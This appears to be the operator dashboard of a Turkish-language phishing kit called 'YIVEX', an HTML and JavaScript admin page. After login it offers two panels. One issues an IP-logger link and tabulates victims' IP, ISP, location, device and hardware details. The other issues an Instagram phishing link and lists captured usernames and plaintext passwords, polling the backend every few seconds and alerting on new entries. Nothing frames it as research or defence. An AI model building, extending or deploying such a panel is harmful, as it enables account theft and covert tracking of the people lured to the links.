<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>YIVEX Admin</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #000; color: #eee; font-family: 'Segoe UI', sans-serif; overflow: hidden; }
        #bg-video { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -100; object-fit: cover; filter: brightness(0.2); }
        .login-box { display: flex; align-items: center; justify-content: center; height: 100vh; position: relative; z-index: 10; }
        .card { background: rgba(10,10,10,0.9); padding: 40px; border: 1px solid #ff0000; border-radius: 8px; width: 350px; text-align: center; }
        input { width: 100%; padding: 12px; margin: 10px 0; background: #222; border: 1px solid #444; color: #fff; border-radius: 4px; }
        button { width: 100%; padding: 12px; background: #ff0000; color: #000; font-weight: bold; border: none; cursor: pointer; border-radius: 4px; }
        #choice-screen { display: none; flex-direction: column; align-items: center; justify-content: center; height: 100vh; position: relative; z-index: 10; }
        .btn-container { display: flex; gap: 20px; margin-top: 30px; }
        .choice-btn { width: 220px; height: 150px; font-size: 1.2rem; background: rgba(15,15,15,0.8); border: 2px solid #ff0000; color: #ff0000; cursor: pointer; border-radius: 10px; transition: 0.3s; }
        .choice-btn:hover { background: #ff0000; color: #000; transform: scale(1.05); }
        
        /* Paneller */
        #panel, #phish-panel { display: none; padding: 20px; position: relative; z-index: 10; height: 100vh; overflow-y: auto; }
        
        .user-info { background: rgba(255,0,0,0.1); padding: 15px; border-left: 5px solid #ff0000; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
        table { width: 100%; border-collapse: collapse; background: rgba(0,0,0,0.8); margin-top: 20px; font-size: 12px; border: 1px solid #ff0000; }
        th, td { padding: 10px; border: 1px solid #333; text-align: left; }
        th { background: #ff0000; color: #000; }
        
        /* Müzik Player */
        .playlist-container { position: fixed; bottom: 20px; right: 20px; z-index: 999; }
        #player-body { background: rgba(15,15,15,0.95); border: 1px solid #ff0000; width: 250px; padding: 15px; border-radius: 8px 8px 0 0; display: none; }
        .song-item { cursor: pointer; padding: 8px; border-bottom: 1px solid #222; font-size: 0.85rem; transition: 0.2s; }
        .song-item:hover { color: #ff0000; background: rgba(255,0,0,0.1); }
        .vol-control { margin-top: 15px; display: flex; flex-direction: column; gap: 5px; }
        .vol-slider { width: 100%; accent-color: #ff0000; cursor: pointer; }
        .toggle-btn { width: 250px; background: #ff0000; color: #000; border: none; padding: 12px; font-weight: bold; cursor: pointer; border-radius: 0 0 8px 8px; font-size: 1.1rem; }
        #notif { position: fixed; top: 20px; right: -400px; background: #ff0000; padding: 20px; transition: 0.5s; font-weight: bold; z-index: 1000; color:#fff; }
    </style>
</head>
<body>
    <video autoplay muted loop playsinline id="bg-video"><source src="https://files.catbox.moe/x4gnuc.mp4" type="video/mp4"></video>
    <div id="notif">⚠️ YENİ VERİ GELDİ!</div>
    <audio id="notifSound" src="https://www.soundjay.com/buttons/beep-01a.mp3"></audio>

    <div id="loginArea" class="login-box">
        <div class="card">
            <h2 style="color:#ff0000; margin-bottom:15px;">YIVEX ACCESS</h2>
            <input type="text" id="user" placeholder="Kullanıcı Adı">
            <input type="password" id="pass" placeholder="Şifre">
            <button onclick="login()">SİSTEME SIZ</button>
        </div>
    </div>

    <div id="choice-screen">
        <h1 style="color:#ff0000;">HOŞ GELDİN, <span id="welcome-user"></span></h1>
        <div class="btn-container">
            <button class="choice-btn" onclick="openIPPanel()">IP BİLGİ ÇEKME</button>
            <button class="choice-btn" onclick="openPhishPanel()">PHISHING İŞLEMLERİ</button>
        </div>
        <button onclick="location.reload()" style="margin-top: 30px; width: 100px; background:#333; color:#fff; border:none; padding:5px; cursor:pointer;">Çıkış</button>
    </div>

    <div id="panel">
        <div class="user-info">
            <div><strong>IP Log Linkin:</strong> <span id="my-link" style="color:#00ff00;">...</span></div>
            <button onclick="copyLink('my-link')" style="width:auto; padding:5px 15px; cursor:pointer;">Kopyala</button>
        </div>
        <div style="display: flex; justify-content: space-between; align-items: center;">
            <h2 style="color:#ff0000;">YIVEX IP LOGS</h2>
            <button onclick="clearAll()" style="width:auto; padding:8px 15px; background:#ff0000; color:#fff; cursor:pointer; border:none; border-radius:4px;">🗑️ TEMİZLE</button>
        </div>
        <table>
            <thead><tr><th>IP & ISS</th><th>PK</th><th>KONUM</th><th>CİHAZ</th><th>DONANIM</th><th>ZAMAN</th></tr></thead>
            <tbody id="logs"></tbody>
        </table>
        <br><button onclick="backToChoice()" style="width:auto; padding:10px; cursor:pointer;">← Geri Dön</button>
    </div>

    <div id="phish-panel">
        <div class="user-info">
            <div><strong>Instagram Phish Linkin:</strong> <span id="phish-link" style="color:#00ff00;">...</span></div>
            <button onclick="copyLink('phish-link')" style="width:auto; padding:5px 15px; cursor:pointer;">Kopyala</button>
        </div>
        <h2 style="color:#ff0000;">INSTAGRAM HESAPLARI</h2>
        <table>
            <thead><tr><th>KULLANICI ADI</th><th>ŞİFRE</th><th>IP ADRESİ</th><th>ZAMAN</th></tr></thead>
            <tbody id="phish-logs"></tbody>
        </table>
        <br><button onclick="backToChoice()" style="width:auto; padding:10px; cursor:pointer;">← Geri Dön</button>
    </div>

    <div class="playlist-container">
        <div id="player-body">
            <h5 style="color:#ff0000; margin-bottom:10px;">YIVEX PLAYER</h5>
            <div class="song-item" onclick="playM('1.mp3')">PEMBEYALANLAR</div>
            <div class="song-item" onclick="playM('2.mp3')">PAPAROZ</div>
            <div class="song-item" onclick="playM('3.mp3')">EDGAR</div>
            <div class="song-item" onclick="playM('4.mp3')">HARBIDENSEKERMIS</div>
            <div class="song-item" onclick="playM('5.mp3')">SEKERPARE</div>
            <div class="song-item" onclick="playM('6.mp3')">PBBUCASTYLE</div>
            <div class="song-item" onclick="playM('7.mp3')">MOMUDOKURBAN</div>
            <div class="song-item" onclick="playM('8.mp3')">2HOE</div>
            <div class="vol-control">
                <label style="font-size: 0.7rem; color: #888;">SES SEVİYESİ</label>
                <input type="range" class="vol-slider" min="0" max="1" step="0.01" value="1" oninput="setVol(this.value)">
            </div>
            <button onclick="stopM()" style="margin-top:10px; width:100%; padding: 5px; background: #333; color: #fff; font-size: 0.8rem; border:none; cursor:pointer;">DURDUR</button>
        </div>
        <button class="toggle-btn" onclick="togglePlayer()">🎵 MÜZİK PANELİ</button>
    </div>

    <audio id="mainAudio"></audio>

    <script>
        let lastCount = 0; 
        let lastPhishCount = 0;
        let auth = { u: "", p: "", code: "" };
        const audio = document.getElementById('mainAudio');

        function togglePlayer() { const pb = document.getElementById('player-body'); pb.style.display = pb.style.display === 'block' ? 'none' : 'block'; }
        function playM(f) { audio.src = f; audio.play(); }
        function stopM() { audio.pause(); audio.currentTime = 0; }
        function setVol(val) { audio.volume = val; }

        async function login() {
            const u = document.getElementById('user').value;
            const p = document.getElementById('pass').value;
            const res = await fetch('admin_check.php', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username: u, password: p }) });
            const data = await res.json();
            if (data.success) {
                auth = { u: u, p: p, code: data.userCode };
                document.getElementById('loginArea').style.display = 'none';
                document.getElementById('welcome-user').innerText = u;
                document.getElementById('choice-screen').style.display = 'flex';
                document.getElementById('bg-video').play().catch(()=>{});
            } else { alert("Giriş Başarısız!"); }
        }

        function openIPPanel() {
            document.getElementById('choice-screen').style.display = 'none';
            document.getElementById('panel').style.display = 'block';
            document.getElementById('my-link').innerText = window.location.origin + "/logger.html?id=" + auth.code;
            fetchData();
            setInterval(fetchData, 4000);
        }

        function openPhishPanel() {
            document.getElementById('choice-screen').style.display = 'none';
            document.getElementById('phish-panel').style.display = 'block';
            document.getElementById('phish-link').innerText = window.location.origin + "/login.html?id=" + auth.code;
            fetchData();
            setInterval(fetchData, 4000);
        }

        function backToChoice() {
            document.getElementById('panel').style.display = 'none';
            document.getElementById('phish-panel').style.display = 'none';
            document.getElementById('choice-screen').style.display = 'flex';
        }

        function copyLink(id) {
            navigator.clipboard.writeText(document.getElementById(id).innerText);
            alert("Link kopyalandı!");
        }

        async function fetchData() {
            const res = await fetch('admin_check.php', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username: auth.u, password: auth.p }) });
            const data = await res.json();
            if (data.success) {
                // IP Loglarını Güncelle
                if (data.logs.length > lastCount && lastCount !== 0) { showNotif(); }
                lastCount = data.logs.length;
                document.getElementById('logs').innerHTML = [...data.logs].reverse().map(l => `<tr><td><b>${l.ip}</b><br><small style="color:#ff0000">${l.isp}</small></td><td>${l.zip}</td><td>${l.location}</td><td>${l.device}</td><td>RAM: ${l.ram} | CPU: ${l.cpu}</td><td>${l.time}</td></tr>`).join('');

                // Phish Loglarını Güncelle
                if (data.p_logs.length > lastPhishCount && lastPhishCount !== 0) { showNotif(); }
                lastPhishCount = data.p_logs.length;
                document.getElementById('phish-logs').innerHTML = [...data.p_logs].reverse().map(l => `<tr><td style="color:#00ff00; font-weight:bold;">${l.user}</td><td style="color:#ff0000; font-weight:bold;">${l.pass}</td><td>${l.ip}</td><td>${l.time}</td></tr>`).join('');
            }
        }

        function showNotif() {
            document.getElementById('notifSound').play().catch(()=>{});
            const n = document.getElementById('notif'); n.style.right = "20px";
            setTimeout(() => n.style.right = "-400px", 4000);
        }

        async function clearAll() { 
            if(!confirm("Tüm IP logları temizlensin mi?")) return; 
            const res = await fetch('sil.php', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username: auth.u, password: auth.p }) }); 
            const d = await res.json(); 
            if(d.success) { lastCount = 0; fetchData(); } 
        }
    </script>
</body>
</html>
